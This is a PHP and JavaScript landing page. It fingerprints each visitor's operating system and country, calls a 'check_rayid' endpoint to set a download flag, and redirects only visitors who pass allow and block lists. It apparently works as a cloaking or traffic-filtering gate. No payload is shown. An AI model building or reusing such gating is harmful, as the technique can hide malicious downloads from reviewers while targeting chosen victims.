<?php

// session start
session_start();

// Load JSON settings file
$settingsFile = './api/settings.json'; // Path to the settings file
$settingsFileStr = file_get_contents($settingsFile);
$settings = json_decode($settingsFileStr, false);

$pageStatus = $settings->PageStatus;
$GEO = $settings->GEO;
$BlockedGEO = $settings->BlockedGEO;
$settingOS = $settings->OS;
$version = $settings->Version->Enabled;


$country_code;
$OS;
$isDownload;

if (isset($_REQUEST['country_code'])) $country_code = $_REQUEST['country_code'];
if (isset($_REQUEST['OS'])) $OS = $_REQUEST['OS'];
if (isset($_REQUEST['isDownload'])) $isDownload = $_REQUEST['isDownload'];

var_dump($country_code);
var_dump($OS);
var_dump($isDownload);

// Get the main domain dynamically
$mainDomain = $_SERVER['HTTP_HOST']; // Extracts the domain name, like "domain.com"

if ($pageStatus == 'ON' && in_array($OS, $settingOS) && (in_array($country_code, $GEO) || in_array('100', $GEO)) && !in_array($country_code, $BlockedGEO)) {
	header("Location: https://$mainDomain/$version");
}


?>

<?php if (!$_REQUEST['country_code']): ?>

<script type="text/javascript" src="./V3/assets/js/jquery.min.js"></script>
<script type="text/javascript">
    
	let isDownload = false;
	let country_code = '';
	
	$.ajax({
		type: 'POST',
		url: '/api/check_rayid.php',
		data: JSON.stringify({ rayid: '' }),
		contentType: 'application/json', // Indicate that you're sending JSON
		success: function(res) {
			console.log(res)
			if (res == '10') {
				isDownload = true;
			}

			$.get('https://ipinfo.io/json', function(ipinfo) {
				country_code = ipinfo.country;

				location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '') + `?country_code=${country_code}&OS=${OS}&isDownload=${isDownload}`;
			})
		}
	})


	// get OS
	const OS = getOS();
	function getOS() {
		const userAgent = navigator.userAgent;
		if (/Windows/i.test(userAgent)) return 'Windows';
		if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
		if (/Android/i.test(userAgent)) return 'Android';
		if (/iPhone|iPad/i.test(userAgent)) return 'iPhone';
		return 'Unknown OS';
	}


</script>

<?php endif; ?>